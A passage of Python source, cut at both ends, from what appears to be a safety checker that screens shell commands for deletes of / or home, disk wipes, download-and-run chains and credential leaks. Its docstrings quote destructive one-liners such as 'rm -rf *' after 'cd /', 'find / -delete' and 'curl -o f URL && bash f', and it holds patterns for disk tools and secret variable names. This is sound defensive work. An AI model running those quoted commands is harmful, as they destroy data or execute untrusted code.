    again, so ``eval 'cd $X'`` and ``eval "cd $X"`` run a ``cd`` whose ``$X`` is UNQUOTED (unset, that is a plain
    ``cd``, home), while ``eval 'cd "$X"'`` still runs a quoted one (``cd ""`` fails). Any other command: ``sub``."""
    pre = _strip_wrappers(_past_reserved(_tokens(sub)))
    if len(pre) > 1 and os.path.basename(pre[0]) == "eval":
        return " ".join(pre[1:])
    return sub


def _unquoted_expansion(sub: str) -> bool:
    """Whether the text ``sub`` has a ``$`` or a backtick outside quotes: an expansion that may give no word at all.
    A ``$(...)``, backtick or ``${...}`` in double quotes is one unit, skipped whole (see _unit_end)."""
    i, n, dquoted = 0, len(sub), False
    while i < n:
        c = sub[i]
        if c == "\\":
            i += 2
            continue
        if c == '"':
            dquoted = not dquoted
        elif c == "'" and not dquoted:
            j = sub.find("'", i + 1)
            i = n if j < 0 else j
        elif c in "$`":
            if not dquoted:
                return True
            end = _unit_end(sub, i)
            if end == -2:
                return True  # an unclosed unit: where the quotes end is unknown
            i = max(i, end)
        i += 1
    return False


def _join_dir(base: str, t: str) -> str:
    """The directory ``cd t`` goes to from ``base``, normalised (``//x`` is ``/x``)."""
    d = os.path.normpath(os.path.join(base, t))
    return "/" + d.lstrip("/") if d.startswith("//") else d


_CDPATH_VALUE = re.compile(r"""\bCDPATH=("[^"]*"|'[^']*'|[^\s;&|()<>]*)""")


def _cdpath_entries(command: str) -> tuple[str, ...] | None:
    """None when neither ``command`` nor the environment mentions CDPATH, else the literal absolute entries of the
    values it is given on the line (``CDPATH=/srv cd app``, ``export CDPATH=/srv``) and in the environment."""
    env = os.environ.get("CDPATH")
    if env is None and "CDPATH" not in command:
        return None
    values = [m.group(1).strip("\"'") for m in _CDPATH_VALUE.finditer(command)]
    entries = [e for v in [*values, env or ""] for e in v.split(":")]
    return tuple(dict.fromkeys(e for e in entries if e.startswith("/") and not any(c in e for c in "$`\\")))


#: How many directories a command line may ``cd`` into (the cwd included) before a relative rm/find target is too many
#: places to read: each is read in every one of them (see _Dirs), so past the cap such a target is denied
#: (``scan-depth``) rather than read thousands of times over.
_CD_MAX_DIRS = 32


@dataclass(frozen=True)
class _Where:
    """The directories a sub may run in, taken at that sub (see _Dirs.where)."""

    dirs: tuple[str | None, ...]
    overflow: bool
    here: str | None
    #: the variables the line had set to literals at that sub: a substitution runs there, not at the end of the line
    known: tuple[tuple[str, tuple[str, ...]], ...] = ()


class _Dirs:
    """The directories a simple command of the line may run in, followed in line order: the cwd and every directory a
    ``cd``/``pushd`` before it went to (``all``). A cd may fail (``cd /; cd /nonexistent; rm -rf *``), run in a
    subshell, a pipeline stage or the background and not take effect (``cd / && (cd tmp) && rm -rf *``), or be
    something else than the builtin (a function, an alias), so no directory ever leaves the set, ``&&`` after a cd
    included. ``here`` is where the line is if every cd took effect (None once unknown): it only resolves the next
    relative cd. A cd to an unquoted variable adds home, which a plain ``cd`` (the variable unset) goes to; ``cd "$X"``
    is ``cd ""``, which fails. ``cdpath`` is None when no CDPATH is in play, else its literal absolute entries (see
    _cdpath_entries): a relative cd may then go to any of them or, through an entry it cannot read, anywhere, read as
    ``/``. A command nested in a sub (a payload, a heredoc script) starts in the directories of that sub (see spawn).

    The cwd itself never leaves the set either, so from a session rooted at $HOME or ``/`` a delete after a cd into a
    harmless directory is refused (``cd build && rm -rf *``, ``cd dist && rm -rf ./*``, ``cd x && find . -delete``,
    ``cd /srv/app && rm -rf ./*``); from a project directory it is allowed. The permission engine asks a person before
    every bash command in such a session anyway.

    Known gaps, left as they are: ``here`` drifts past a cd that did not take effect, so a later relative cd is resolved
    from the wrong place when no dangerous directory is in the set (``cd /usr/local; (cd x); cd ..; rm -rf *``); and a
    line that cds into _CD_MAX_DIRS distinct directories or more has every later relative recursive delete refused
    (``scan-depth``), however harmless. Not modelled either: loops (``for i in a b; do cd .. && rm -rf *; done``) and
    a function body run after a later cd, ``shopt -s cdable_vars``, ``trap 'cd /' DEBUG``, ``. /dev/stdin <<< 'cd /'``,
    an OLDPWD set on the line (``OLDPWD=/; cd /tmp && cd -``) and a symlink made on the line. ``cd build || exit 1;
    rm -rf *`` (the SC2164 idiom) is refused from $HOME or ``/``."""

    def __init__(
        self,
        start: list[str | None],
        here: str | None,
        home: str,
        cdpath: tuple[str, ...] | None = None,
        *,
        overflow: bool = False,
    ) -> None:
        self.home = home
        self.cdpath = cdpath
        self.here = here
        self.all: dict[str | None, None] = dict.fromkeys(start)  # insertion-ordered set
        self.overflow = overflow or len(self.all) > _CD_MAX_DIRS
        self._stack: list[str | None] = []  # pushd's directory stack, for popd
        self.known: dict[str, tuple[str, ...]] = {}  # variables the line set to a literal (see _note_vars)

    def where(self) -> _Where:
        return _Where(tuple(self.all), self.overflow, self.here, tuple(self.known.items()))

    def spawn(self, wheres: list[_Where]) -> _Dirs:
        """A model for a command nested in the subs taken at ``wheres`` (a payload, a heredoc script): it starts in
        every directory they may run in."""
        if not wheres:
            wheres = [_Where(tuple(self.all), self.overflow, None, tuple(self.known.items()))]
        start = list(dict.fromkeys(d for w in wheres for d in w.dirs))
        heres = {w.here for w in wheres}
        here = heres.pop() if len(heres) == 1 else None
        overflow = any(w.overflow for w in wheres)
        child = _Dirs(start, here, self.home, self.cdpath, overflow=overflow)
        child.known = _merge_known([dict(w.known) for w in wheres])
        return child

    def _add(self, d: str) -> None:
        if d not in self.all:
            if len(self.all) >= _CD_MAX_DIRS:
                self.overflow = True
            else:
                self.all[d] = None

    def follow(self, argv: list[str], sub: str) -> None:
        """Take in the simple command ``argv`` (read from the text ``sub``) if it changes directory (cd, pushd,
        popd)."""
        _note_vars(self.known, _tokens(sub), argv)
        name = argv[0] if argv else ""
        if self.overflow:
            return  # every later relative delete is scan-depth: where the line goes no longer matters
        if name == "popd":
            self.here = self._stack.pop() if self._stack and len(argv) == 1 else None
            return
        if name not in ("cd", "pushd"):
            return
        operands: list[str] = []
        for a in argv[1:]:
            if not operands and a.startswith("-") and a != "-":
                continue  # -L, -P, -e, -@, --
            operands.append(a)
        if name == "pushd":
            self._stack.append(self.here)
        self._follow_operands(name, operands, sub)

    def _follow_operands(self, name: str, operands: list[str], sub: str) -> None:
        if not operands:
            if name == "cd":
                self._add(self.home)
            self.here = self.home if name == "cd" else None  # pushd alone swaps the top two of the stack
            return
        if past_budget(operands[0]):
            self.overflow = True  # whose home it is was not looked up: the line may go anywhere from here
            return
        t = expand_vars(operands[0], self.here, self.home)
        if name == "cd" and any(c in t for c in "$`") and _unquoted_expansion(_reparsed_text(sub)):
            self._add(self.home)  # unset, `cd $X` is a plain `cd`; `cd "$X"` is `cd ""`, which fails
        if t == "-" or t.startswith("+") or any(c in t for c in "$`~"):
            self.here = None  # OLDPWD, a stack entry (already in the set), a variable, ~user
            return
        if t[:1] == "/":
            self.here = _join_dir("/", t)
            self._add(self.here)
            return
        # relative: from here, or from every directory the line may be in when here is unknown (fail closed)
        bases = [self.here] if self.here is not None else [d for d in self.all if d is not None]
        joined = list(dict.fromkeys(_join_dir(b, t) for b in bases))
        for d in joined:
            self._add(d)
        self.here = joined[0] if len(joined) == 1 else None
        if self.cdpath is not None and t.split("/", 1)[0] not in ("", ".", ".."):
            if len(self.cdpath) >= _CD_MAX_DIRS:
                self.overflow = True  # too many places to go: walking them all for every cd grew with the square
            for entry in ("/", *self.cdpath):  # CDPATH: bash tries its entries for an operand not starting . or ..
                if self.overflow:
                    break
                self._add(_join_dir(entry, t))
            self.here = None  # it may have gone to any of them


def _delete_target_rule(t: str, here: str | None, home: str, above_home: bool = False) -> str | None:
    """The rule a recursive delete of the path word ``t`` run in the directory ``here`` breaks: rm-rf-home for ~, $HOME
    (and, with ``above_home``, a folder above it), rm-rf-root for /, a top-level system dir or a Windows drive (see
    windows_rm_target), or everything in one of those (``/usr/*``). A relative ``t`` is read in ``here`` (``../..`` from
    ``~/projects/demo`` is ``~``), and ``$PWD`` is it."""
    if not t:
        return None
    path = os.path.join(here, t) if here and not t.startswith(("/", "~", "$")) else t
    target = _expand_target(path, here, home)
    folder = (target[:-2] if target.endswith("/*") else target) or "/"  # `/*` is everything in /
    if folder in _DANGEROUS_RM_TARGETS or folder == home:
        own_tilde = "~" in t and not _TILDE_USER.match(t)  # `~root` is root's folder, not home
        homeish = own_tilde or "HOME" in t or path.startswith("/home") or folder == home
        return "rm-rf-home" if homeish else "rm-rf-root"
    if above_home and folder.startswith("/") and home.startswith(folder.rstrip("/") + "/"):
        return "rm-rf-home"
    from .engine import windows_drives  # engine imports this module

    if windows_rm_target(target.lower(), windows_drives()):
        return "rm-rf-root"  # a Windows drive, system folder or profile reached through WSL (issue #169)
    return None


#: ``~N``, ``~+N``, ``~-N``: the N-th entry of the directory stack (``pushd``/``popd``/``dirs``).
_TILDE_STACK = re.compile(r"~[+-]?[0-9]+(?=/|$)")


def _delete_rule_in(t: str, dirs: _Dirs, home: str, above_home: bool = False) -> str | None:
    """:func:`_delete_target_rule` of ``t`` in every directory of ``dirs`` it may run in: a relative ``t`` or one with
    ``$PWD`` depends on it, another is read once. Past _CD_MAX_DIRS directories a relative one is ``scan-depth``."""
    if t in ("~+", "~-") or t.startswith(("~+/", "~-/")):
        t = "$PWD" + t[2:]  # the current or previous directory: one of the set, read in every one
    elif m := _TILDE_STACK.match(t):
        t = "$PWD" + t[m.end() :]  # ~1, ~+1, ~-1: an entry of the directory stack, which is in the set as well
    if past_budget(t):
        return "scan-budget"  # another user's folder whose home was not looked up: it may be any folder (~bin is /bin)
    if t.startswith(("/", "~", "$")) and "PWD" not in t:
        return _delete_target_rule(t, None, home, above_home)
    if dirs.overflow:
        return "scan-depth"
    for here in dirs.all:
        hit = _delete_target_rule(t, here, home, above_home)
        if hit:
            return hit
    return None


def _rm_check(argv: list[str], dirs: _Dirs, home: str) -> str | None:
    """``rm`` with a recursive flag on /, ~, $HOME or a top-level system dir, whatever the flag spelling
    (-rf, -fr, -r -f, -R, --recursive, ...) or path spelling (``/.``, ``~/.``, ``/usr/..``, ``$PWD`` at /, ``*`` after
    ``cd /``: see _delete_rule_in)."""
    if not argv or argv[0] != "rm":
        return None
    flags: list[str] = []
    targets: list[str] = []
    done = False
    for t in argv[1:]:
        if not done and t == "--":
            done = True
        elif not done and t.startswith("-") and t != "-":
            flags.append(t)
        else:
            targets.append(t)
    recursive = any(t == "--recursive" or (not t.startswith("--") and ("r" in t or "R" in t)) for t in flags)
    if not recursive:
        return None
    for t in (r for raw in targets for r in _resolve_target(raw, dirs.known)):  # `X=/; rm -rf $X` is `rm -rf /`
        hit = _delete_rule_in(t, dirs, home)
        if hit:
            return hit
    return None


#: find actions that run a command on every file found, up to a ``;`` or ``+``.
_FIND_EXEC_ACTIONS = frozenset({"-exec", "-execdir", "-ok", "-okdir"})


def _find_check(argv: list[str], dirs: _Dirs, home: str) -> str | None:
    """``find`` deleting what it finds (``-delete``, or ``-exec``/``-execdir``/``-ok``/``-okdir`` running rm) under
    a start path an ``rm -rf`` of which is refused (see _rm_check) or a folder above home: ``find ~ -delete``, ``find
    $HOME -exec rm -rf {} +``, ``find / -delete``. No start path is ``.``, which after ``cd /`` is the root."""
    if not argv or argv[0] != "find":
        return None
    i = 1
    while i < len(argv) and (argv[i] in ("-H", "-L", "-P") or argv[i][:2] in ("-D", "-O")):
        i += 2 if argv[i] == "-D" else 1  # the options before the start paths (``-D debugopts``, ``-O3``)
    paths: list[str] = []
    while i < len(argv) and not argv[i].startswith("-") and argv[i] not in ("(", "!", ","):
        paths.append(argv[i])
        i += 1
    expr = argv[i:]
    deletes = "-delete" in expr
    k = 0
    while not deletes and k < len(expr):
        if expr[k] in _FIND_EXEC_ACTIONS:
            # the command runs up to the `;` or `+` that ends the action, and the next action starts after it (an
            # `-exec` in the command is one of its words): every word is read once
            end = k + 1
            while end < len(expr) and expr[end] not in (";", "+"):
                end += 1
            deletes = _command_argv(expr[k + 1 : end])[:1] == ["rm"]
            k = end
        k += 1
    if not deletes:
        return None
    for p in paths or ["."]:
        hit = _delete_rule_in(p, dirs, home, above_home=True)
        if hit:
            return hit
    return None


def _xargs_rm_check(pipelines: list[list[str]], dirs: _Dirs, home: str) -> str | None:
    """``... | xargs rm -rf``: xargs adds what the earlier stages of the pipeline print to rm's arguments, so a word of
    theirs that rm -rf must not get (``echo ~ | xargs rm -rf``, ``find $HOME | xargs rm -r``) is checked as one of
    rm's targets (see _rm_check). Each printed word is checked once, as it is printed: the first one that hits stands
    for them all."""
    for stages in pipelines:
        if len(stages) < 2 or not any("xargs" in s for s in stages[1:]):
            continue
        bad: str | None = None  # the first printed word an rm -r must not get
        for stage in stages:
            argv = _command_argv(_tokens(stage))
            if bad is not None and argv[:1] == ["rm"] and "xargs" in stage:
                words = [os.path.basename(t) for t in _tokens(stage)]
                fed = "rm" in words and "xargs" in words[: words.index("rm")]  # xargs runs this rm
                if fed and (hit := _rm_check([*argv, "--", bad], dirs, home)):
                    return hit
            if bad is None:
                bad = next((w for w in argv[1:] if _delete_rule_in(w, dirs, home)), None)
    return None


#: Whole disks and partitions (not /dev/null, /dev/zero, /dev/tty or a loop device a test image lives on).
_BLOCK_DEVICE = re.compile(
    r"^/dev/(?:sd[a-z]+|hd[a-z]+|vd[a-z]+|xvd[a-z]+|nvme\d+n\d+|mmcblk\d+|dm-\d+|md\d+|mapper/.+|disk/by-[\w-]+/.+)"
    r"(?:p?\d+)?$"
)
#: Programs that repartition, relabel or wipe the device they are given, and the read-only options that only list it.
_DISK_TOOLS: dict[str, frozenset[str]] = {
    "mkswap": frozenset(),
    "shred": frozenset(),
    "blkdiscard": frozenset(),
    "sfdisk": frozenset({"-l", "--list", "-s", "--show-size", "-d", "--dump", "-J", "--json", "-g", "-V", "--verify"}),
    "fdisk": frozenset({"-l", "--list", "-s"}),
    "gdisk": frozenset({"-l"}),
    "sgdisk": frozenset({"-p", "--print", "-l", "--load-backup", "-E", "--end-of-largest", "-v", "--verify"}),
}
_PARTED_WRITES = frozenset({"mklabel", "mktable", "mkpart", "mkpartfs", "rm", "resizepart", "resize", "move", "name"})
#: The word after a redirect operator: quoted pieces and plain characters up to a space or an operator.
_REDIRECT_WORD_TEXT = re.compile(r"""(?:'[^']*'|"(?:\\.|[^"\\])*"|\\.|[^\s;&|<>()'"\\])+""")


def _out_redirect_targets(sub: str) -> list[str]:
    """The words the output redirects of the simple command ``sub`` write to (``>``, ``>>``, ``>|``, ``>&``, ``&>``,
    ``2>``, ``<>``), read from its text so that a ``>`` inside quotes (an ``echo`` or a commit message) is text, and one
    glued to the word before it (``cat x>/dev/sda``) is still a redirect."""
    out: list[str] = []
    i, n, quote = 0, len(sub), ""
    while i < n:
        c = sub[i]
        if quote:
            if c == "\\" and quote == '"':
                i += 2
                continue
            if c == quote:
                quote = ""
            i += 1
            continue
        if c == "\\":
            i += 2
            continue
        if c in "'\"":
            quote = c
            i += 1
            continue
        if c == ">" or (c == "<" and sub[i + 1 : i + 2] == ">"):
            j = i + (2 if c == "<" else 1)
            if j < n and sub[j] in ">|&":
                j += 1
            while j < n and sub[j] in " \t":
                j += 1
            if m := _REDIRECT_WORD_TEXT.match(sub, j):
                try:
                    pieces = shlex.split(m.group(0))
                except ValueError:
                    pieces = [m.group(0)]
                out.extend(pieces[:1])
                i = m.end()
                continue
        i += 1
    return out


#: Programs whose operands are written to: every operand (``tee``, ``truncate``) or the last (``cp``, ``mv``).
_WRITES_ALL = frozenset({"tee", "truncate", "sponge"})
_WRITES_LAST = frozenset({"cp", "mv", "install"})


def _block_device_check(argv: list[str], sub: str) -> str | None:
    """Output redirected onto a disk, or a program that wipes, relabels or copies onto one. ``sub`` is the simple
    command's text with the redirections still in (``argv`` is its normalised program and arguments)."""
    for target in _out_redirect_targets(sub):
        if _BLOCK_DEVICE.match(target):
            return "block-device-write"
    if not argv:
        return None
    name, args = os.path.basename(argv[0]), _without_redirects(argv[1:])
    devices = [a for a in args if _BLOCK_DEVICE.match(a)]
    if not devices:
        return None
    if name in _DISK_TOOLS:
        return None if _DISK_TOOLS[name] & set(args) else "block-device-write"
    if name == "parted":
        return "block-device-write" if _PARTED_WRITES & set(args) else None
    if name == "wipefs":  # lists signatures unless told to erase them (-n / --no-act is the dry run)
        erase = {"-a", "--all", "-o", "--offset"} & set(args)
        return "block-device-write" if erase and not {"-n", "--no-act"} & set(args) else None
    operands = [a for a in args if not a.startswith("-")]
    if name in _WRITES_ALL and devices:
        return "block-device-write"
    if name in _WRITES_LAST and operands and _BLOCK_DEVICE.match(operands[-1]):
        return "block-device-write"
    return None


def _destroy_check(argv: list[str], sub: str, home: str) -> str | None:
    """Recursive chmod/chown/chgrp on /, ~ or $HOME, ``rsync --delete`` into one of them, and writes onto a disk."""
    hit = _block_device_check(argv, sub)
    if hit or not argv:
        return hit
    name, args = os.path.basename(argv[0]), _without_redirects(argv[1:])
    if name in ("chmod", "chown", "chgrp"):
        recursive = any(a == "--recursive" or (a.startswith("-") and not a.startswith("--") and "R" in a) for a in args)
        positional = [a for a in args if not a.startswith("-")]
        targets = positional if any(a.startswith("--reference") for a in args) else positional[1:]
        if recursive:
            for t in targets:
                if t.startswith(("/", "~", "$")) and _delete_target_rule(t, None, home):
                    return f"{name}-recursive-root"
    elif name == "rsync" and any(a == "--del" or a.startswith("--delete") for a in args):
        operands = [a for a in args if not a.startswith("-")]
        dest = operands[-1] if len(operands) > 1 else ""
        remote = ":" in dest.split("/", 1)[0]  # host:path is another machine's
        if not remote and dest.startswith(("/", "~", "$")) and _delete_target_rule(dest, None, home):
            return "rsync-delete-root"
    return None


def _download_targets(argv: list[str], sub: str) -> list[str]:
    """The files a download command line writes: ``curl -o F`` / ``-oF``, ``wget -O F`` (also in a cluster, ``-qO F``),
    the url's own file name for ``curl -O`` and for ``wget`` without ``-O`` (under ``--output-dir`` / ``-P`` when given)
    and a redirect (``curl x > F``)."""
    name = os.path.basename(argv[0]) if argv else ""
    if name not in _FETCHERS:
        return []
    out: list[str] = []
    letter = {"curl": "o", "wget": "O"}.get(name, "")
    args = argv[1:]
    named = remote_name = False
    prefix = ""
    for i, a in enumerate(args):
        nxt = args[i + 1] if i + 1 < len(args) else ""
        if a.startswith("--"):
            key, eq, value = a.partition("=")
            if key in ("--output", "--output-document"):
                named = True
                out.append(value if eq else nxt)
            elif key in ("--remote-name", "--remote-name-all"):
                remote_name = True
            elif key in ("--output-dir", "--directory-prefix"):
                prefix = value if eq else nxt
        elif a == "-P" and name == "wget":
            prefix = nxt
        elif letter and a.startswith("-") and len(a) > 1 and a.endswith(letter) and nxt:
            named = True
            out.append(nxt)
        elif letter and a.startswith("-") and len(a) > 2 and (at := a.find(letter, 1)) > 0:
            named = True  # the name glued to the flag: -oFILE, -qOFILE
            out.append(a[at + 1 :])
        elif name == "curl" and a.startswith("-") and len(a) > 1 and a.endswith("O"):
            remote_name = True  # -O, -LO, -fsSLO: saved under the url's file name
    if not named and (remote_name or name == "wget"):  # wget always saves under it; curl only with -O
        for a in args:
            if "://" in a and not a.startswith("-"):
                out.append(urlsplit(a).path.rstrip("/").rsplit("/", 1)[-1] or "index.html")
    if prefix:
        out = [t if t.startswith("/") else os.path.join(prefix, t) for t in out]
    out += _out_redirect_targets(sub)
    return [t for t in out if t and t != "-" and not t.startswith("&")]


def _download_run_check(argv: list[str], fetched: set[str]) -> str | None:
    """A later command of the same line that runs a file an earlier one downloaded (``curl -o f URL && bash f``,
    ``wget -qO f URL; . f``, ``curl URL > f && ./f``)."""
    if not argv or not fetched:
        return None
    seen = {os.path.normpath(f) for f in fetched}
    name = os.path.basename(argv[0])
    if _is_interpreter(name):
        operands = [a for a in _without_redirects(argv[1:]) if not a.startswith("-")]
        if operands and os.path.normpath(operands[0]) in seen:
            return "download-and-run"
    elif os.path.normpath(argv[0]) in seen:
        return "download-and-run"
    return None


#: ``$(echo WORDS)`` / ```echo WORDS``` with nothing but literal words: what a delete or push really gets.
_STATIC_ECHO = re.compile(
    r"\$\(\s*echo\s+(?:-[neE]+\s+)*([^()$`;&|<>\"']*?)\s*\)|`\s*echo\s+(?:-[neE]+\s+)*([^`$;&|<>\"']*?)\s*`"
)


def _resolve_echo(sub: str) -> str:
    return _STATIC_ECHO.sub(lambda m: m.group(1) if m.group(1) is not None else (m.group(2) or ""), sub)


#: A whole word that is one variable, optionally followed by a path: ``$X``, ``${X}``, ``$X/build``.
_WHOLE_VAR = re.compile(r"^\$\{?(\w+)\}?(/.*)?$")
#: Values a variable can hold and still be read statically: literals, and $HOME / $PWD (see _delete_target_rule).
_KNOWN_VALUE = re.compile(r"^(?:[^$`]*|\$\{?(?:HOME|PWD)\}?(?:/.*)?)$")


#: ``${X:-d}`` / ``${X-d}`` / ``${X:=d}`` / ``${X=d}``: X's value, or d when X is unset (or empty); ``${X:+d}`` /
#: ``${X+d}``: d when X is set; ``${X:?msg}`` stops the script when X is unset (no default).
_DEFAULTED_VAR = re.compile(r"^\$\{(\w+)(:?[-=+?])([^}]*)\}(/.*)?$")
#: What a variable may hold besides the literals the line gave it: something this does not follow.
_UNKNOWN = "\0?"
#: Commands whose operands (or flags) name the variables they set.
_NAMED_WRITERS = frozenset({"read", "mapfile", "readarray", "unset", "getopts", "let"})
#: Commands that may set any variable: the code they run is not followed, so every known variable may also hold
#: something else afterwards (what it held stays possible).
_ANY_WRITERS = frozenset({"eval", "source", "."})


def _merge_known(snapshots: list[dict[str, tuple[str, ...]]]) -> dict[str, tuple[str, ...]]:
    """What the line may have set at any of several points (a substitution that came from more than one sub): a
    variable holds every value any of them gave it."""
    merged: dict[str, tuple[str, ...]] = {}
    for snap in snapshots:
        for name, values in snap.items():
            merged[name] = tuple(dict.fromkeys((*merged.get(name, ()), *values)))
    return merged


def _note_vars(known: dict[str, tuple[str, ...]], tokens: list[str], argv: list[str]) -> None:
    """Record what the simple command ``tokens`` assigns, so a later delete of ``$X`` is read as what it holds:
    ``X=/``, ``Y=$X`` (a copy of a known one), ``export X=/``, ``for X in a b``. A value the shell computes
    (``X=$(..)``, ``for X in *``) is forgotten. ``read X``, ``unset X``, ``printf -v X``, ``let X=..`` and
    ``declare -n`` forget the names they write and leave the others as they were; ``eval`` and ``source`` may write
    any, so each known variable may now also hold something unknown."""
    words = _past_reserved(tokens)
    while words and words[0] in ("time", "-p"):  # `time X=/` still sets X
        words = words[1:]
    name0 = os.path.basename(argv[0]) if argv else ""
    first = os.path.basename(words[0]) if words else ""  # `eval` is unwrapped out of argv
    operands = [a for a in argv[1:] if not a.startswith("-")]
    flags = [a for a in argv[1:] if a.startswith("-")]
    if name0 in _ANY_WRITERS or first in _ANY_WRITERS:
        for n, values in known.items():
            if _UNKNOWN not in values:
                known[n] = (*values, _UNKNOWN)
        return
    if name0 in _NAMED_WRITERS or first in _NAMED_WRITERS:
        written = [a.partition("=")[0] for a in operands if a.partition("=")[0].isidentifier()]
        if name0 == "let":  # `let X=1 Y+=2`
            written = [m.group(1) for a in operands if (m := re.match(r"^(\w+)(?:[-+*/%&|^]|<<|>>)?=", a))]
        elif name0 == "read" and not written:
            written = ["REPLY"]
        elif name0 == "getopts":
            written += ["OPTARG", "OPTIND"]
        for n in written:
            known.pop(n, None)
        return
    if name0 == "printf" and "-v" in argv:
        i = argv.index("-v")
        if i + 1 < len(argv):
            known.pop(argv[i + 1].partition("[")[0], None)
        return
    if name0 in ("declare", "typeset", "local") and any("n" in f for f in flags if not f.startswith("--")):
        for a in operands:  # a nameref: what it names is no longer what it was set to
            known.pop(a.partition("=")[0], None)
        return
    for w in words:
        if m := re.match(r"^(\w+)\+=", w):  # `X+=more` changes X to something this does not follow
            known.pop(m.group(1), None)
    assigns: list[str] = []
    if words and all(_is_assignment(w) for w in words):
        assigns = words
    elif name0 in ("export", "declare", "typeset", "local", "readonly"):
        assigns = [w for w in argv[1:] if _is_assignment(w)]
    for w in assigns:
        name, _, value = w.partition("=")
        values = _resolve_target(value, known)
        good = [v for v in values if _KNOWN_VALUE.match(v)]
        if good and len(good) == len(values):
            known[name] = tuple(values)
        elif good:  # a copy of a variable that may also hold something unknown
            known[name] = (*good, _UNKNOWN)
        else:
            known.pop(name, None)
    if tokens[:1] == ["for"] and len(tokens) > 3 and tokens[2] == "in" and tokens[1].isidentifier():
        items = tokens[3:]
        if all(_KNOWN_VALUE.match(i) and not any(c in i for c in "*?[{") for i in items):
            known[tokens[1]] = tuple(items)
        else:
            known.pop(tokens[1], None)


def _resolve_target(t: str, known: dict[str, tuple[str, ...]]) -> list[str]:
    """``t`` with a variable it starts with replaced by every value it may hold: the known ones, and for
    ``${X:-default}`` the default as well (X may be unset); unchanged when it is not known."""
    if m := _DEFAULTED_VAR.match(t):
        name, op, default, rest = m.group(1), m.group(2), m.group(3), m.group(4) or ""
        out = [default + rest] if "?" not in op else []  # `${X:?}` stops the script instead of falling back
        if "+" not in op:  # `${X:+d}` is d or nothing, never X's own value
            out += [v + rest for v in known.get(name, ()) if v != _UNKNOWN]
        return out or [t]
    m = _WHOLE_VAR.match(t)
    if m and m.group(1) in known:
        values, rest = known[m.group(1)], m.group(2) or ""
        out = [v + rest for v in values if v != _UNKNOWN]
        if _UNKNOWN in values:
            out.append(t)  # it may also hold something unknown: the word itself, as a variable nobody knows
        return out
    return [t]


#: A whole word that is one expansion other than $HOME / $PWD (``$X``, ``${X}``, ``${A[0]}``) or a command
#: substitution, alone or followed by ``/`` or ``/*``: whatever it holds, and the root if it holds nothing.
#: ``${X:?msg}`` is left out: it stops the script when X is unset, the guard shellcheck recommends before ``/*``.
_BARE_EXPANSION = re.compile(
    r"^(?:\$\{(?!(?:HOME|PWD)\})(?!\w+:?\?)[^}]*\}|\$(?!(?:HOME|PWD)\b)\w+|\$\(.*|`.*)(?:/\*?)?$"
)
#: A variable named for a credential: a whole word of its name (``GITHUB_TOKEN``, ``AWS_SECRET_ACCESS_KEY``, ``KEY_ID``)
#: or a name that ends in one of the long words (``PGPASSWORD``, ``GITHUBTOKEN``, ``AWSSECRETKEY``), not a substring
#: (``MONKEY``, ``TOKENIZER``).
_SECRET_VAR = re.compile(
    r"(?i)(?:^|_)(?:API_?KEYS?|KEYS?|SECRETS?|TOKENS?|PASSWORD|PASSWD|CREDENTIALS?)(?:_|$)"
    r"|(?:PASSWORD|PASSWD|PASSPHRASE|SECRET|TOKEN|APIKEY|SECRETKEY|ACCESSKEY|PRIVATEKEY|CREDENTIALS?)$"
)
_VAR_REF = re.compile(r"\$(?:\{(\w+)[^}]*\}|(\w+))")
_ENV_READ = re.compile(r"environ|process\.env|\bENV\b|getenv")
_INTERPRETER_CODE_FLAG = re.compile(r"^-[A-Za-z]*[ceEpr]$")


def _git_sub(argv: list[str]) -> tuple[str, list[str]]:
    """``(subcommand, arguments)`` of a ``git`` command line, past git's own options (``git -C dir reset --hard``)."""
    if not argv or os.path.basename(argv[0]) != "git":
        return "", []
    i = 1
    while i < len(argv):
        if argv[i] in _GIT_VALUE_OPTS:
            i += 2
        elif argv[i].startswith("-"):
            i += 1
        else:
            return argv[i], argv[i + 1 :]
    return "", []


def _human_sub(argv: list[str], known: dict[str, tuple[str, ...]]) -> str | None:
    """Why a person must confirm the simple command ``argv`` (see :func:`human_check`), or None."""
    if not argv:
        return None
    name = os.path.basename(argv[0])
    sub, args = _git_sub(argv)
    if sub == "push":
        for a in args:
            long_force = a.split("=", 1)[0] in ("--force", "--force-with-lease", "--force-if-includes")
            short = a[1:] if a.startswith("-") and not a.startswith("--") else ""
            if long_force or "f" in short or (not a.startswith("-") and a.startswith("+")):
                return "Force-pushes, which can overwrite the remote history"
    elif sub == "reset" and "--hard" in args:
        return "git reset --hard discards uncommitted changes"
    elif sub == "clean":
        force = any(a == "--force" or (a.startswith("-") and not a.startswith("--") and "f" in a) for a in args)
        dry = any(a == "--dry-run" or (a.startswith("-") and not a.startswith("--") and "n" in a) for a in args)
        if force and not dry:
            return "git clean -f deletes untracked files for good"
    elif name == "rm":
        flags = [t for t in argv[1:] if t.startswith("-") and t != "--"]
        if any(t == "--recursive" or (not t.startswith("--") and ("r" in t or "R" in t)) for t in flags):
            for t in (t for t in argv[1:] if not t.startswith("-")):
                # `$X/build` names a place inside; a bare `$X` or `$(cmd)` can be anything
                if any(_BARE_EXPANSION.match(r) for r in _resolve_target(t, known)):
                    return "rm -r on a path the command line does not show"
    elif name in ("echo", "printf", "print"):
        for a in argv[1:]:
            for m in _VAR_REF.finditer(a):
                if _SECRET_VAR.search(m.group(1) or m.group(2) or ""):
                    return "Prints a variable that holds a credential"
    elif _is_interpreter(name) and name not in _SHELLS and name not in ("source", ".", "eval"):
        for flag, code in zip(argv[1:], argv[2:], strict=False):
            if _INTERPRETER_CODE_FLAG.match(flag) and _ENV_READ.search(code):
                return "Reads the whole environment, which holds credentials"
    return None


def _human_parsed(parsed: Parsed, known: dict[str, tuple[str, ...]]) -> str | None:
    need = {k for ks in parsed.child_subs for k in ks}
    at: dict[int, dict[str, tuple[str, ...]]] = {}  # the variables at each sub a child came from
    for k, sub in enumerate(parsed.subs):
        if k in need:
            at[k] = dict(known)
        tokens = _tokens(sub)
        argv = _command_argv(tokens)
        spelled = _resolve_echo(sub)  # `rm -rf $(echo build)` deletes `build`: read the line as it runs
        hit = _human_sub(argv if spelled == sub else _command_argv(_tokens(spelled)), known)
        if hit:
            return hit
        _note_vars(known, tokens, argv)
    for child, ks in zip(parsed.children, parsed.child_subs, strict=True):
        seen = [at[k] for k in ks if k in at]  # a substitution runs where it sits, not where the line ends
        hit = _human_parsed(child, _merge_known(seen) if seen else dict(known))
        if hit:
            return hit
    return None


def human_check(parsed: Parsed) -> str | None:
    """Why a person must confirm the command line even though no rule forbids it, or None: force pushes, ``git reset
    --hard``, ``git clean -f``, a recursive delete of a path only a variable names, printing a credential variable and
